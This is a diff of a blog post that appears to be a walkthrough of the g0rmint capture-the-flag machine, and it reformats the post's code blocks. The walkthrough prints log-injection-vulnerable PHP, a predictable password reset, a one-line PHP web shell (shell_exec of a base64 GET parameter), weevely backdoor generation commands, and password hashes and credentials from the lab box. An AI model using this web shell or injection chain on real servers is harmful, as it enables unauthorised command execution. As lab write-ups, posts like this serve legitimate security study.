@@ -59,20 +59,22 @@ I [learned](https://www.slideshare.net/phpcodemonkey/exploiting-php-with-php) [s
 
 I proceeded to install on my stack to see behind the scenes. At first glance `config.php` seemed to be the most interesting file. The addlog() function generates logfiles and allows to inject arbitrary code through the email field in the login form:
 
-    function addlog($log, $reason) {
-        $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php";
-        if (file_exists($myFile)) {
-            $fh = fopen($myFile, 'a');
-            fwrite($fh, $reason . $log . "<br>\\n");
-        } else {
-            $fh = fopen($myFile, 'w');
-            fwrite($fh, file_get_contents("dummy.php") . "<br>\\n");
-            fclose($fh);
-            $fh = fopen($myFile, 'a');
-            fwrite($fh, $reason . $log . "<br>\\n");
-        }
+```php
+function addlog($log, $reason) {
+    $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php";
+    if (file_exists($myFile)) {
+        $fh = fopen($myFile, 'a');
+        fwrite($fh, $reason . $log . "<br>\\n");
+    } else {
+        $fh = fopen($myFile, 'w');
+        fwrite($fh, file_get_contents("dummy.php") . "<br>\\n");
         fclose($fh);
+        $fh = fopen($myFile, 'a');
+        fwrite($fh, $reason . $log . "<br>\\n");
     }
+    fclose($fh);
+}
+```
 
 ![]({{ site.baseurl }}/forestryio/images/2017-11-21 08_25_23.png)
 
@@ -82,29 +84,31 @@ Log file with injected code. What a pity the header only allows authenticated us
 
 So I went back to the password reset function:
 
-    <?php
-    include_once('config.php');
-    $message = "";
-    if (isset($_POST['submit'])) { // If form is submitted
-        $email = $_POST['email'];
-        $user = $_POST['user'];
-        $sql = $pdo->prepare("SELECT * FROM g0rmint WHERE email = :email AND username = :user");
-        $sql->bindParam(":email", $email);
-        $sql->bindParam(":user", $user);
+```php
+<?php
+include_once('config.php');
+$message = "";
+if (isset($_POST['submit'])) { // If form is submitted
+    $email = $_POST['email'];
+    $user = $_POST['user'];
+    $sql = $pdo->prepare("SELECT * FROM g0rmint WHERE email = :email AND username = :user");
+    $sql->bindParam(":email", $email);
+    $sql->bindParam(":user", $user);
+    $row = $sql->execute();
+    $result = $sql->fetch(PDO::FETCH_ASSOC);
+    if (count($result) > 1) {
+        $password = substr(hash('sha1', gmdate("l jS \of F Y h:i:s A")), 0, 20);
+        $password = md5($password);
+        $sql = $pdo->prepare("UPDATE g0rmint SET pass = :pass where id = 1");
+        $sql->bindParam(":pass", $password);
         $row = $sql->execute();
-        $result = $sql->fetch(PDO::FETCH_ASSOC);
-        if (count($result) > 1) {
-            $password = substr(hash('sha1', gmdate("l jS \of F Y h:i:s A")), 0, 20);
-            $password = md5($password);
-            $sql = $pdo->prepare("UPDATE g0rmint SET pass = :pass where id = 1");
-            $sql->bindParam(":pass", $password);
-            $row = $sql->execute();
-            $message = "A new password has been sent to your email";
-        } else {
-            $message = "User not found in our database";
-        }
+        $message = "A new password has been sent to your email";
+    } else {
+        $message = "User not found in our database";
     }
-    ?>
+}
+?>
+```
 
 If given a legitimate user, the function generates a new password based on gmdate. Luckily the date is displayed in the footer of every page, so the password is easy to generate:
 
@@ -122,7 +126,9 @@ Hidden in plane sight in `style.css` another few hours lost looking stupid. Burp
 
 Now as a legitimate user i could read the logfiles and as unauthenticated user write to the file through a "failed login". The function escapes quotes by [adding slashes](http://php.net/manual/en/function.addslashes.php), so I had to use one without:
 
-    <?php echo shell_exec(base64_decode($_GET[cmd])); ?>
+```php
+<?php echo shell_exec(base64_decode($_GET[cmd])); ?>
+```
 
 ![]({{ site.baseurl }}/forestryio/images/2017-11-22 16_34_44.png)
 
@@ -132,10 +138,12 @@ Cool. A quick test showed it worked:
 
 And I could inject a weevely shell to feel a little more comfortable:
 
-    ./weevely.py generate n0man  \~/web/html/g0rmint/weevely3/backd00r
-    
-    # convert to base64:
-    cat backd000r |grep base64
+```bash
+./weevely.py generate n0man  \~/web/html/g0rmint/weevely3/backd00r
+
+# convert to base64:
+cat backd000r |grep base64
+```
 
 Get the backdoor onto the server:
 
@@ -153,15 +161,19 @@ Although [everything](https://github.com/rebootuser/LinEnum) [I tried](https://b
 
 The sql dump of this backup contained:
 
-    INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
-    (1, 'noman', 'w3bdrill3r@gmail.com', 'ea60b43e48f3c2de55e4fc89b3da53dc');
+```mysql
+INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
+(1, 'noman', 'w3bdrill3r@gmail.com', 'ea60b43e48f3c2de55e4fc89b3da53dc');
+```
 
 ![]({{ site.baseurl }}/forestryio/images/2017-11-23 14_03_10.png)
 
 as opposed to:
 
-    INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
-    (1, 'demo', 'demo@example.com', 'fe01ce2a7fbac8fafaed7c982a04e229');
+```mysql
+INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
+(1, 'demo', 'demo@example.com', 'fe01ce2a7fbac8fafaed7c982a04e229');
+```
 
 pw: demo
 
@@ -172,3 +184,5 @@ So I tried logging through ssh with username g0rmint and password tayyab123:
 Damn you [@NomanRiffat](https://twitter.com/NomanRiffat/), you caused me some severe headaches!!
 
 Thanks for teaching me a thing or two about the value of enumerating all the things. Looking forward to g0rmint 2.
+
+&nbsp;
